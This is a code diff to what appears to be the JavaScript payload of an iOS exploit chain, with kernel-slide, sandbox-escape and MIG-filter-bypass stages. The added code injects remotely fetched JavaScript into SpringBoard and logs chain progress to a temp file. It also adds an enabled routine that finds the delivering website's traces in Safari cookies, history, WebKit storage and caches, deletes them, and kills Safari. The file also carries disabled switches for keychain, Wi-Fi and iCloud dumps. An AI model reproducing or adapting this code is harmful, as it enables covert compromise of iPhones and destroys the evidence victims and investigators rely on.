@@ -8488,6 +8488,11 @@ const ENABLE_CORUNA_TWEAKLOADER = false;
 const ENABLE_SPRINGBOARD_JS_TWEAK = (typeof globalThis.__ls_enable_fiveicon === 'undefined' && typeof globalThis.__ls_enable_powercuff === 'undefined' && typeof globalThis.__ls_enable_mgpatcher === 'undefined' && typeof globalThis.__ls_enable_applimit === 'undefined') ? true : !!globalThis.__ls_enable_fiveicon;
 const SPRINGBOARD_JS_TWEAK_PATH = "/sbcustomizer_light.js";
 const SPRINGBOARD_JS_TWEAK_LABEL = "SBCustomizer JS";
+const ENABLE_CHAIN_STATUS_OVERLAY = globalThis.__ls_enable_chain_overlay === true;
+const CHAIN_STATUS_OVERLAY_PATH = "/chain_status_overlay.js";
+const CHAIN_STATUS_OVERLAY_LABEL = "Chain Status Overlay";
+const CHAIN_STATUS_LOG_PATH = "/private/var/tmp/lightsaber_chain_status.log";
+const CHAIN_STATUS_MAX_BUFFER_LINES = 192;
 const ENABLE_POWERCUFF_TWEAK = !!globalThis.__ls_enable_powercuff;
 const POWERCUFF_TWEAK_PATH = "/powercuff_light.js";
 const POWERCUFF_TWEAK_LABEL = "Powercuff";
@@ -8496,6 +8501,7 @@ const MG_FLAGS = (typeof globalThis.__mg_flags === 'string') ? globalThis.__mg_f
 const MG_UNFLAGS = (typeof globalThis.__mg_unflags === 'string') ? globalThis.__mg_unflags : '';
 const ENABLE_APPLIMIT_REQUESTED = !!globalThis.__ls_enable_applimit;
 const ENABLE_APPLIMIT = false;
+const ENABLE_SPRINGBOARD_AGENT = ENABLE_CORUNA_TWEAKLOADER || ENABLE_SPRINGBOARD_JS_TWEAK || ENABLE_CHAIN_STATUS_OVERLAY;
 // sbcustomizer_light.js dispatches to the SpringBoard main thread
 // asynchronously. When it runs without Powercuff piggybacking on it, keep the
 // chain alive briefly so the dispatched main-thread work has time to run
@@ -8506,6 +8512,81 @@ const ENABLE_KEYCHAIN_DUMP = false;
 const ENABLE_WIFI_DUMP = false;
 const ENABLE_ICLOUD_DUMP = false;
 const ENABLE_DUMP_COPYOUT = false;
+const ENABLE_SAFARI_ORIGIN_AUDIT = true;
+const ENABLE_SAFARI_ORIGIN_DELETE = true;
+const ENABLE_SAFARI_KILL_AFTER_CLEAN = true;
+
+let chainStatusLogReady = false;
+let chainStatusBuffer = [];
+let chainStatusLastLine = "";
+const CHAIN_STATUS_FILTER_RE = /\[PE\]|\[PE-DBG\]|\[SBX1\]|\[SBC\]|\[POWERCUFF\]|\[FILE-DL\]|\[FILE-DL-EARLY\]|\[HTTP-UPLOAD\]|\[APP\]|\[ICLOUD\]|\[KEYCHAIN\]|\[WIFI\]|\[THREEAPP\]|\[THREEAPP-AUDIT\]|\[SAFARI-CLEAN\]|\[MG\]|\[MPD\]|\[APPLIMIT\]|nativeCallBuff|kernel_base|kernel_slide|SBX0|SBX1|sbx0:|sbx1:|MIG_FILTER_BYPASS |INJECTJS |CHAIN |DRIVER-POSTEXPL |DRIVER-NEWTHREAD |DARKSWORD-WIFI-DUMP |INFO |OFFSETS |FILE-UTILS |PORTRIGHTINSERTER |REGISTERSSTRUCT |REMOTECALL |TASK(?:ROP)? |THREAD |VM |MAIN |EXCEPTION |SANDBOX |PAC (?:diagnostics|ptrs|gadget)|UTILS |^\[[+\-!i]\]\s/i;
+const chainStatusOriginalLog = LOG;
+LOG = function(msg) {
+	try { chainStatusRecord(msg); } catch (_) {}
+	try {
+		chainStatusOriginalLog(msg);
+	} catch (_) {
+		try { console.log(String(msg)); } catch (_) {}
+	}
+};
+
+function chainStatusCleanLine(raw) {
+	let line = String(raw || "").replace(/[\r\n]+/g, " ").trim();
+	if (line.length > 512) line = line.slice(0, 509) + "...";
+	return line;
+}
+
+function chainStatusRecord(raw) {
+	let line = chainStatusCleanLine(raw);
+	if (!line || !CHAIN_STATUS_FILTER_RE.test(line)) return;
+	if (line === chainStatusLastLine) return;
+	chainStatusLastLine = line;
+	if (!chainStatusLogReady) {
+		chainStatusBuffer.push(line);
+		if (chainStatusBuffer.length > CHAIN_STATUS_MAX_BUFFER_LINES) chainStatusBuffer.shift();
+		return;
+	}
+	chainStatusWriteLine(line, false);
+}
+
+function chainStatusWriteLine(line, truncate) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const O_WRONLY = 0x0001;
+	const O_APPEND = 0x0008;
+	const O_CREAT = 0x0200;
+	const O_TRUNC = 0x0400;
+	let flags = O_WRONLY | O_CREAT | (truncate ? O_TRUNC : O_APPEND);
+	let fd = Native.callSymbol("open", CHAIN_STATUS_LOG_PATH, flags, 0o644);
+	if (Number(fd) < 0) return false;
+	let ptr = 0n;
+	try {
+		let out = chainStatusCleanLine(line) + "\n";
+		let data = Native.stringToBytes(out, false);
+		ptr = Native.callSymbol("malloc", BigInt(data.byteLength));
+		if (!ptr || ptr === 0n) return false;
+		Native.write(ptr, data);
+		Native.callSymbol("write", fd, ptr, data.byteLength);
+		Native.callSymbol("fchmod", fd, 0o644);
+		return true;
+	} finally {
+		if (ptr) Native.callSymbol("free", ptr);
+		Native.callSymbol("close", fd);
+	}
+}
+
+function chainStatusInitLog() {
+	if (chainStatusLogReady) return;
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	try {
+		Native.callSymbol("mkdir", "/private/var/tmp", 0o777n);
+		Native.callSymbol("chmod", "/private/var/tmp", 0o777n);
+	} catch (_) {}
+	chainStatusWriteLine("[PE] chain status log reset", true);
+	chainStatusLogReady = true;
+	for (let line of chainStatusBuffer) chainStatusWriteLine(line, false);
+	chainStatusBuffer = [];
+}
+
 
 function fetchRemoteScript(path) {
 	if (!PE_ENABLE_DEBUG_NETWORK) {
@@ -8690,6 +8771,33 @@ function injectLightweightSpringBoardPayload(existingTask, migFilterBypass, agen
 	}
 }
 
+function injectChainStatusOverlay(existingTask, migFilterBypass, agentPid) {
+	LOG("[PE] Injecting " + CHAIN_STATUS_OVERLAY_LABEL + " into SpringBoard...");
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code source: " + (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0 ? "prefetched (" + globalThis.__chain_status_overlay_code.length + " bytes)" : "fetchRemoteScript(" + CHAIN_STATUS_OVERLAY_PATH + ")"));
+	let code = (typeof globalThis.__chain_status_overlay_code === 'string' && globalThis.__chain_status_overlay_code.length > 0) ? globalThis.__chain_status_overlay_code : fetchRemoteScript(CHAIN_STATUS_OVERLAY_PATH);
+	if (!code) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " fetch failed");
+		return false;
+	}
+	const prelude =
+		'globalThis.__ls_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
+		'globalThis.__bb_chain_status_path = ' + JSON.stringify(CHAIN_STATUS_LOG_PATH) + ';\n' +
+		'globalThis.__ls_chain_status_complete_marker = "[PE] start() completed successfully";\n' +
+		'globalThis.__bb_chain_status_complete_marker = "[PE] start() completed successfully";\n';
+	code = prelude + code;
+	LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " code loaded: " + code.length + " bytes");
+	try {
+		let loader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](existingTask, code, migFilterBypass);
+		let ok = loader.inject(agentPid);
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject result: " + ok);
+		return ok;
+	} catch (e) {
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " inject exception: " + String(e));
+		LOG("[PE] " + CHAIN_STATUS_OVERLAY_LABEL + " stack: " + (e.stack || "no stack"));
+		return false;
+	}
+}
+
 function injectThermalmonitordPayload(migFilterBypass, path, label) {
 	// Validate the requested level here (in mediaplaybackd's pe_main.js context)
 	// and bake it into a prelude that runs inside thermalmonitord's JSC realm,
@@ -8747,6 +8855,894 @@ function runOptionalStage(label, enabled, fn) {
 	}
 }
 
+function terminateSafariAfterClean(remoteKillTask) {
+	const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+	const PROC_ALL_PIDS = 1;
+	const SIGTERM = 15;
+	const SIGKILL = 9;
+	const MAX_PID_SCAN_BYTES = 65536;
+
+	function getProcName(pid) {
+		let buf = Native.callSymbol("malloc", 128n);
+		if (!buf || buf === 0n) return "";
+		try {
+			let ret = Native.callSymbol("proc_name", pid, buf, 128);
+			if (Number(ret) <= 0) return "";
+			return Native.readString(BigInt(buf), 128).replace(/\0/g, "");
+		} finally {
+			Native.callSymbol("free", buf);
+		}
+	}
+
+	function getProcPath(pid) {
+		let buf = Native.callSymbol("malloc", 1024n);
+		if (!buf || buf === 0n) return "";
+		try {
+			let ret = Native.callSymbol("proc_pidpath", pid, buf, 1024);
+			if (Number(ret) <= 0) return "";
+			return Native.readString(BigInt(buf), 1024).replace(/\0/g, "");
+		} finally {
+			Native.callSymbol("free", buf);
+		}
+	}
+
+	function isSafariProcess(name, path) {
+		if (name === "MobileSafari") return true;
+		let lowerPath = String(path || "").toLowerCase();
+		return lowerPath.indexOf("/mobilesafari.app/mobilesafari") >= 0;
+	}
+
+	function nativeErrno() {
+		let ep = Native.callSymbol("__error");
+		return ep ? Native.read32(BigInt(ep)) : -1;
+	}
+
+	function pidStillExists(pid) {
+		return getProcName(pid).length > 0;
+	}
+
+	function remoteKill(pid, sig, label) {
+		if (!remoteKillTask || !remoteKillTask.success || !remoteKillTask.success()) return { ret: -999, errno: -999 };
+		let ret = remoteKillTask.call(1000, "kill", pid, sig);
+		let errno = 0;
+		if (Number(ret) !== 0) {
+			let ep = remoteKillTask.call(1000, "__error");
+			if (ep) {
+				let errnoBuf = Native.callSymbol("malloc", 4n);
+				if (errnoBuf && errnoBuf !== 0n) {
+					try {
+						if (remoteKillTask.read(BigInt(ep), errnoBuf, 4n)) errno = Native.read32(BigInt(errnoBuf));
+					} finally {
+						Native.callSymbol("free", errnoBuf);
+					}
+				}
+			}
+		}
+		LOG("[SAFARI-CLEAN] safari-kill " + label + " remote pid=" + pid + " sig=" + sig + " ret=" + ret + " errno=" + errno);
+		return { ret: ret, errno: errno };
+	}
+
+	let needed = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, 0n, 0));
+	if (!isFinite(needed) || needed <= 0) needed = 4096;
+	let scanBytes = needed + 4096;
+	if (scanBytes > MAX_PID_SCAN_BYTES) scanBytes = MAX_PID_SCAN_BYTES;
+	let pidBuf = Native.callSymbol("malloc", BigInt(scanBytes));
+	if (!pidBuf || pidBuf === 0n) {
+		LOG("[SAFARI-CLEAN] safari-kill failed: malloc pid buffer");
+		return false;
+	}
+
+	let currentPid = Number(Native.callSymbol("getpid"));
+	let matched = 0;
+	let signaled = 0;
+	let terminated = 0;
+	try {
+		let got = Number(Native.callSymbol("proc_listpids", PROC_ALL_PIDS, 0, pidBuf, scanBytes));
+		if (!isFinite(got) || got <= 0) {
+			LOG("[SAFARI-CLEAN] safari-kill proc_listpids failed ret=" + got);
+			return false;
+		}
+		if (got > scanBytes) got = scanBytes;
+		let data = Native.read(BigInt(pidBuf), got);
+		let view = new DataView(data);
+		let count = Math.floor(got / 4);
+		for (let i = 0; i < count; i++) {
+			let pid = view.getInt32(i * 4, true);
+			if (pid <= 0 || pid === currentPid) continue;
+			let name = getProcName(pid);
+			let path = getProcPath(pid);
+			if (!isSafariProcess(name, path)) continue;
+			matched++;
+			let ret = Native.callSymbol("kill", pid, SIGTERM);
+			let errno = Number(ret) === 0 ? 0 : nativeErrno();
+			LOG("[SAFARI-CLEAN] safari-kill pid=" + pid + " name=" + name + " ret=" + ret + " errno=" + errno + " path=" + path);
+			let sent = Number(ret) === 0;
+			if (!sent && errno === 1) {
+				let remoteRet = remoteKill(pid, SIGTERM, "term");
+				sent = Number(remoteRet.ret) === 0;
+			}
+			if (sent) {
+				signaled++;
+				Native.callSymbol("usleep", 250000);
+				if (pidStillExists(pid)) {
+					let hardRet = Native.callSymbol("kill", pid, SIGKILL);
+					let hardErrno = Number(hardRet) === 0 ? 0 : nativeErrno();
+					LOG("[SAFARI-CLEAN] safari-kill hard pid=" + pid + " ret=" + hardRet + " errno=" + hardErrno);
+					if (Number(hardRet) !== 0 && hardErrno === 1) remoteKill(pid, SIGKILL, "hard");
+					Native.callSymbol("usleep", 250000);
+				}
+				if (!pidStillExists(pid)) terminated++;
+			}
+		}
+		LOG("[SAFARI-CLEAN] safari-kill done matched=" + matched + " signaled=" + signaled + " terminated=" + terminated);
+		return terminated > 0 || matched === 0;
+	} finally {
+		Native.callSymbol("free", pidBuf);
+	}
+}
+
+	function auditSafariOriginData() {
+		const Native = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"];
+		const Sandbox = libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"];
+		const MAX_SCAN_ENTRIES = 5000;
+		const MAX_CANDIDATE_LOGS = 200;
+		const MAX_CONTENT_SCAN_FILES = 260;
+		const MAX_CONTENT_SCAN_BYTES_PER_FILE = 1024 * 1024;
+		const MAX_TOTAL_CONTENT_SCAN_BYTES = 24 * 1024 * 1024;
+		const MAX_DELETE_TREE_ENTRIES = 2400;
+	const tokenPaths = [
+		"/private/var/mobile/Library/",
+		"/private/var/mobile/Library/WebKit/",
+		"/private/var/mobile/Library/WebKit/WebsiteDataStore/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/Default/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/",
+		"/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/",
+		"/private/var/mobile/Library/Safari/",
+		"/private/var/mobile/Library/Caches/",
+		"/private/var/mobile/Library/Caches/com.apple.mobilesafari/",
+		"/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/",
+		"/private/var/mobile/Library/Caches/WebKit/",
+		"/private/var/mobile/Library/Caches/WebKit/NetworkCache/",
+		"/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/",
+		"/private/var/mobile/Library/Caches/WebKit/HSTS/",
+		"/private/var/mobile/Library/Caches/WebKit/AlternativeServices/",
+		"/private/var/mobile/Library/Cookies/",
+		"/private/var/mobile/Containers/Data/Application/",
+		"/var/mobile/Containers/Data/Application/",
+		"/private/var/mobile/Containers/Shared/AppGroup/"
+	];
+	let roots = [
+		{ path: "/private/var/mobile/Library/WebKit/", depth: 8 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteDataStore/", depth: 8 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/Default/", depth: 6 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/IndexedDB/", depth: 6 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/LocalStorage/", depth: 5 },
+		{ path: "/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/", depth: 4 },
+		{ path: "/private/var/mobile/Library/Safari/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Caches/com.apple.mobilesafari/", depth: 6 },
+		{ path: "/private/var/mobile/Library/Caches/com.apple.WebKit.Networking/", depth: 6 },
+		{ path: "/private/var/mobile/Library/Caches/WebKit/", depth: 6 },
+		{ path: "/private/var/mobile/Library/Caches/WebKit/NetworkCache/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Caches/WebKit/ServiceWorkers/", depth: 5 },
+		{ path: "/private/var/mobile/Library/Cookies/", depth: 3 }
+	];
+	const recordStores = [
+		"/private/var/mobile/Library/Cookies/Cookies.binarycookies",
+		"/private/var/mobile/Library/Safari/BrowserState.db",
+		"/private/var/mobile/Library/Safari/PerSitePreferences.db",
+		"/private/var/mobile/Library/Safari/RecentlyClosedTabs.plist",
+		"/private/var/mobile/Library/WebKit/WebsiteData/ServiceWorkers/ServiceWorkerRegistrations.db",
+		"/private/var/mobile/Library/WebKit/WebsiteData/ResourceLoadStatistics/observations.db",
+		"/private/var/mobile/Library/Safari/History.db"
+	];
+
+	function cleanString(raw, maxLen) {
+		let s = (typeof raw === "string") ? raw : "";
+		s = s.replace(/[\x00-\x1f\x7f]/g, "");
+		if (s.length > maxLen) s = s.slice(0, maxLen);
+		return s;
+	}
+
+	function hostFromOrigin(origin) {
+		let s = cleanString(origin, 256).toLowerCase();
+		s = s.replace(/^[a-z0-9.+-]+:\/\//, "");
+		let slash = s.indexOf("/");
+		if (slash >= 0) s = s.slice(0, slash);
+		let at = s.lastIndexOf("@");
+		if (at >= 0) s = s.slice(at + 1);
+		if (s.charAt(0) === "[") return "";
+		let colon = s.indexOf(":");
+		if (colon >= 0) s = s.slice(0, colon);
+		return s.replace(/[^a-z0-9.-]/g, "");
+	}
+
+	function schemeFromOrigin(origin) {
+		let s = cleanString(origin, 256).toLowerCase();
+		if (s.indexOf("http://") === 0) return "http";
+		if (s.indexOf("https://") === 0) return "https";
+		return "";
+	}
+
+	function pathToken(rawPath) {
+		let p = cleanString(rawPath, 256).toLowerCase();
+		p = p.replace(/^\/+/, "");
+		let slash = p.indexOf("/");
+		if (slash >= 0) p = p.slice(0, slash);
+		return p.replace(/[^a-z0-9._-]/g, "");
+	}
+
+	function addUnique(list, value) {
+		if (!value || list.indexOf(value) >= 0) return;
+		list.push(value);
+	}
+
+	function buildVariants(origin, host) {
+		let variants = [];
+		let scheme = schemeFromOrigin(origin);
+		addUnique(variants, host);
+		addUnique(variants, host.replace(/\./g, "_"));
+		addUnique(variants, host.replace(/\./g, "-"));
+		addUnique(variants, host.replace(/\./g, "%2e"));
+		if (scheme) {
+			addUnique(variants, scheme + "_" + host);
+			addUnique(variants, scheme + "://" + host);
+			try { addUnique(variants, encodeURIComponent(scheme + "://" + host)); } catch (_) {}
+		}
+		return variants;
+	}
+
+	function readDirent(entPtr) {
+		if (!entPtr) return null;
+		let ent = BigInt(entPtr);
+		let entBuf = Native.read(ent, 24);
+		let entView = new DataView(entBuf);
+		let namlen = entView.getUint16(18, true);
+		if (namlen === 0 || namlen > 255) return null;
+		return {
+			type: entView.getUint8(20),
+			name: Native.readString(ent + 21n, namlen + 1).replace(/\0/g, "")
+		};
+	}
+
+	function statMode(path) {
+		let statBuf = Native.callSymbol("malloc", 256n);
+		if (!statBuf || statBuf === 0n) return 0;
+		try {
+			let ret = Native.callSymbol("stat", path, statBuf);
+			if (Number(ret) !== 0) return 0;
+			return Native.read16(BigInt(statBuf) + 0x4n);
+		} finally {
+			Native.callSymbol("free", statBuf);
+		}
+	}
+
+	function fileExists(path) {
+		return Number(Native.callSymbol("access", path, 0n)) === 0;
+	}
+
+	function getErrno() {
+		let ep = Native.callSymbol("__error");
+		return ep ? Native.read32(BigInt(ep)) : -1;
+	}
+
+	function isDirPath(path, dType) {
+		if (dType === 4) return true;
+		if (dType === 8) return false;
+		let mode = statMode(path);
+		return (mode & 0xf000) === 0x4000;
+	}
+
+	function tokenForPath(path) {
+		let token = Sandbox.getTokenForPath(path, false);
+		if (!token) {
+			LOG("[SAFARI-CLEAN] token issue failed path=" + path);
+			return false;
+		}
+		let consumeRet = Native.callSymbol("sandbox_extension_consume", token);
+		LOG("[SAFARI-CLEAN] token consumed ret=" + consumeRet + " bytes=" + token.length + " path=" + path);
+		return true;
+	}
+
+	let origin = cleanString(globalThis.__ls_site_origin, 256);
+	let host = hostFromOrigin(globalThis.__ls_site_host || origin);
+	let sitePath = cleanString(globalThis.__ls_site_path || "/", 256);
+	if (!sitePath || sitePath.charAt(0) !== "/") sitePath = "/" + sitePath;
+	let repoToken = pathToken(sitePath);
+
+	if (!host || host.length < 3) {
+		LOG("[SAFARI-CLEAN] audit skipped: missing/invalid host origin=" + origin + " host=" + cleanString(globalThis.__ls_site_host, 128));
+		return false;
+	}
+
+	let hostVariants = buildVariants(origin, host);
+	let pathVariants = [];
+	if (repoToken && repoToken.length >= 4) {
+		addUnique(pathVariants, repoToken);
+		try { addUnique(pathVariants, encodeURIComponent(repoToken)); } catch (_) {}
+	}
+
+	LOG("[SAFARI-CLEAN] audit start delete=" + ENABLE_SAFARI_ORIGIN_DELETE + " origin=" + origin + " host=" + host + " path=" + sitePath + " pathToken=" + (repoToken || "none"));
+	if (sitePath !== "/" && sitePath !== "") {
+		LOG("[SAFARI-CLEAN] note: Safari/WebKit website data is usually origin-scoped; path=" + sitePath + " may share storage with other pages on host=" + host);
+	}
+
+	for (let tokenPath of tokenPaths) tokenForPath(tokenPath);
+
+	let scanned = 0;
+	let candidates = 0;
+	let candidateLogs = 0;
+	let truncated = false;
+	let contentScannedFiles = 0;
+		let contentScannedBytes = 0;
+		let contentHits = 0;
+		let contentTruncated = false;
+		let deletedPaths = 0;
+		let deleteErrors = 0;
+		let deleteTreeEntries = 0;
+		let sqliteFiles = 0;
+		let sqliteRows = 0;
+		let sqliteErrors = 0;
+		let sqliteCleaned = [];
+		let sqliteAvailable = null;
+		let queuedTreeDeletes = [];
+		let queuedTreeDeleteLogs = 0;
+		let queuedTreeDeleted = 0;
+
+	LOG("[SAFARI-CLEAN] WebKit 22F76 paths: Library/WebKit/{WebsiteDataStore,WebsiteData/{Default,IndexedDB,LocalStorage,ResourceLoadStatistics}}, Library/Caches/WebKit/{NetworkCache,ServiceWorkers,HSTS,AlternativeServices}, Library/Caches/com.apple.WebKit.Networking");
+
+		function matchCandidate(path) {
+			let lower = String(path || "").toLowerCase();
+		for (let v of hostVariants) {
+			if (v && lower.indexOf(v.toLowerCase()) >= 0) {
+				return { scope: "origin", token: v };
+			}
+		}
+		for (let v of pathVariants) {
+			if (v && lower.indexOf(v.toLowerCase()) >= 0) {
+				return { scope: "path-token-audit-only", token: v };
+			}
+		}
+			return null;
+		}
+
+		function unlinkPath(path) {
+			let ret = Native.callSymbol("unlink", path);
+			if (Number(ret) === 0) {
+				deletedPaths++;
+				LOG("[SAFARI-CLEAN] delete-file ok path=" + path);
+				return true;
+			}
+			deleteErrors++;
+			LOG("[SAFARI-CLEAN] delete-file failed errno=" + getErrno() + " path=" + path);
+			return false;
+		}
+
+		function deleteTree(path, depth) {
+			if (deleteTreeEntries >= MAX_DELETE_TREE_ENTRIES) {
+				truncated = true;
+				return false;
+			}
+			let mode = statMode(path);
+			let isDir = (mode & 0xf000) === 0x4000;
+			if (!isDir) return unlinkPath(path);
+			let dir = Native.callSymbol("opendir", path);
+			if (!dir) {
+				deleteErrors++;
+				LOG("[SAFARI-CLEAN] delete-dir open failed errno=" + getErrno() + " path=" + path);
+				return false;
+			}
+			try {
+				while (deleteTreeEntries < MAX_DELETE_TREE_ENTRIES) {
+					let entPtr = Native.callSymbol("readdir", dir);
+					if (!entPtr) break;
+					let ent = readDirent(entPtr);
+					if (!ent || !ent.name || ent.name === "." || ent.name === "..") continue;
+					let child = path;
+					if (child.charAt(child.length - 1) !== "/") child += "/";
+					child += ent.name;
+					deleteTreeEntries++;
+					let childIsDir = isDirPath(child, ent.type);
+					if (childIsDir && depth < 12) deleteTree(child, depth + 1);
+					else if (!childIsDir) unlinkPath(child);
+				}
+			} finally {
+				Native.callSymbol("closedir", dir);
+			}
+			let ret = Native.callSymbol("rmdir", path);
+			if (Number(ret) === 0) {
+				deletedPaths++;
+				LOG("[SAFARI-CLEAN] delete-dir ok path=" + path);
+				return true;
+			}
+			deleteErrors++;
+			LOG("[SAFARI-CLEAN] delete-dir failed errno=" + getErrno() + " path=" + path);
+			return false;
+		}
+
+		function logCandidate(path, match, isDir) {
+			candidates++;
+			let action = (ENABLE_SAFARI_ORIGIN_DELETE && match.scope === "origin") ? "delete" : "audit";
+			if (candidateLogs < MAX_CANDIDATE_LOGS) {
+				candidateLogs++;
+				LOG("[SAFARI-CLEAN] candidate scope=" + match.scope + " token=" + match.token + " kind=" + (isDir ? "dir" : "file") + " action=" + action + " path=" + path);
+			} else {
+				truncated = true;
+			}
+			if (ENABLE_SAFARI_ORIGIN_DELETE && match.scope === "origin") {
+				return isDir ? deleteTree(path, 0) : unlinkPath(path);
+			}
+			return false;
+		}
+
+		function normalizeTreeRoot(path) {
+			let p = String(path || "");
+			while (p.length > 1 && p.charAt(p.length - 1) === "/") p = p.slice(0, -1);
+			return p;
+		}
+
+		function queueTreeDelete(path, reason) {
+			if (!ENABLE_SAFARI_ORIGIN_DELETE) return false;
+			let root = normalizeTreeRoot(path);
+			if (!root || root.length < 16) return false;
+			for (let existing of queuedTreeDeletes) {
+				if (root === existing.path || root.indexOf(existing.path + "/") === 0) return true;
+			}
+			for (let i = queuedTreeDeletes.length - 1; i >= 0; i--) {
+				let existing = queuedTreeDeletes[i].path;
+				if (existing.indexOf(root + "/") === 0) queuedTreeDeletes.splice(i, 1);
+			}
+			queuedTreeDeletes.push({ path: root, reason: reason });
+			if (queuedTreeDeleteLogs < 80) {
+				queuedTreeDeleteLogs++;
+				LOG("[SAFARI-CLEAN] queued tree-delete reason=" + reason + " path=" + root);
+			}
+			return true;
+		}
+
+		function isUnderQueuedTreeDelete(path) {
+			let p = normalizeTreeRoot(path);
+			for (let entry of queuedTreeDeletes) {
+				if (p === entry.path || p.indexOf(entry.path + "/") === 0) return true;
+			}
+			return false;
+		}
+
+		function flushQueuedTreeDeletes() {
+			for (let entry of queuedTreeDeletes) {
+				LOG("[SAFARI-CLEAN] tree-delete start reason=" + entry.reason + " path=" + entry.path);
+				if (deleteTree(entry.path, 0)) queuedTreeDeleted++;
+			}
+			LOG("[SAFARI-CLEAN] tree-delete done queued=" + queuedTreeDeletes.length + " deleted=" + queuedTreeDeleted);
+		}
+
+		function sqlString(value) {
+			return "'" + String(value || "").replace(/'/g, "''").toLowerCase() + "'";
+		}
+
+		function sqlIdent(value) {
+			return '"' + String(value || "").replace(/"/g, '""') + '"';
+		}
+
+		function sqliteBasePath(path) {
+			let p = String(path || "");
+			if (p.slice(-4).toLowerCase() === "-wal") return p.slice(0, -4);
+			if (p.slice(-4).toLowerCase() === "-shm") return p.slice(0, -4);
+			return p;
+		}
+
+		function sqliteKind(path) {
+			let lower = sqliteBasePath(path).toLowerCase();
+			if (lower.indexOf(".db") < 0 && lower.indexOf(".sqlite") < 0 && lower.indexOf(".sqlite3") < 0) return "";
+			if (lower.indexOf("/bookmarks.db") >= 0 || lower.indexOf("/cloudtabs.db") >= 0) return "skip-sync-store";
+			if (lower.indexOf("/history.db") >= 0) return "history-path";
+			if (lower.indexOf("/browserstate.db") >= 0 || lower.indexOf("/safaritabs.db") >= 0 || lower.indexOf("/recentlyclosedtabs") >= 0 || lower.indexOf("/persitepreferences.db") >= 0) return "safari-path";
+			if (lower.indexOf("/webkit/") >= 0 || lower.indexOf("/cookies/") >= 0 || lower.indexOf("/website") >= 0) return "origin";
+			return "";
+		}
+
+		function ensureSQLite() {
+			if (sqliteAvailable !== null) return sqliteAvailable;
+			let needed = ["sqlite3_open_v2", "sqlite3_close", "sqlite3_prepare_v2", "sqlite3_step", "sqlite3_finalize", "sqlite3_column_count", "sqlite3_column_name", "sqlite3_column_text", "sqlite3_exec", "sqlite3_changes", "sqlite3_errmsg"];
+			let ok = true;
+			for (let n of needed) {
+				if (!Native.dlsym(n)) {
+					ok = false;
+					break;
+				}
+			}
+			if (!ok) {
+				Native.callSymbol("dlopen", "/usr/lib/libsqlite3.dylib", 9n); // RTLD_LAZY | RTLD_GLOBAL
+				ok = true;
+				for (let n of needed) {
+					if (!Native.dlsym(n)) {
+						ok = false;
+						break;
+					}
+				}
+			}
+			sqliteAvailable = ok;
+			LOG("[SAFARI-CLEAN] sqlite available=" + ok);
+			return ok;
+		}
+
+		function sqliteErrmsg(db) {
+			let p = Native.callSymbol("sqlite3_errmsg", db);
+			return p ? Native.readString(BigInt(p), 384) : "";
+		}
+
+		function sqliteExec(db, sql, label) {
+			let rc = Native.callSymbol("sqlite3_exec", db, sql, 0n, 0n, 0n);
+			let ok = Number(rc) === 0;
+			let changes = 0;
+			if (ok) changes = Number(Native.callSymbol("sqlite3_changes", db));
+			else {
+				sqliteErrors++;
+				LOG("[SAFARI-CLEAN] sqlite exec failed rc=" + rc + " label=" + label + " err=" + sqliteErrmsg(db));
+			}
+			return { ok: ok, changes: changes };
+		}
+
+		function sqliteOpen(path) {
+			if (!ensureSQLite()) return 0n;
+			let dbPtr = Native.callSymbol("malloc", 8n);
+			if (!dbPtr || dbPtr === 0n) return 0n;
+			Native.write64(dbPtr, 0n);
+			let flags = 0x00000002 | 0x00010000; // SQLITE_OPEN_READWRITE | SQLITE_OPEN_FULLMUTEX
+			let rc = Native.callSymbol("sqlite3_open_v2", path, dbPtr, flags, 0n);
+			let db = Native.read64(BigInt(dbPtr));
+			Native.callSymbol("free", dbPtr);
+			if (Number(rc) !== 0 || !db || db === 0n) {
+				sqliteErrors++;
+				LOG("[SAFARI-CLEAN] sqlite open failed rc=" + rc + " path=" + path);
+				if (db && db !== 0n) Native.callSymbol("sqlite3_close", db);
+				return 0n;
+			}
+			sqliteExec(db, "PRAGMA busy_timeout=700;", "busy_timeout");
+			return db;
+		}
+
+		function sqlitePrepare(db, sql) {
+			let stmtPtr = Native.callSymbol("malloc", 8n);
+			if (!stmtPtr || stmtPtr === 0n) return 0n;
+			Native.write64(stmtPtr, 0n);
+			let rc = Native.callSymbol("sqlite3_prepare_v2", db, sql, -1n, stmtPtr, 0n);
+			let stmt = Native.read64(BigInt(stmtPtr));
+			Native.callSymbol("free", stmtPtr);
+			if (Number(rc) !== 0 || !stmt || stmt === 0n) return 0n;
+			return stmt;
+		}
+
+		function sqliteCollectFirstColumn(db, sql, maxRows) {
+			let out = [];
+			let stmt = sqlitePrepare(db, sql);
+			if (!stmt) return out;
+			try {
+				while (out.length < maxRows) {
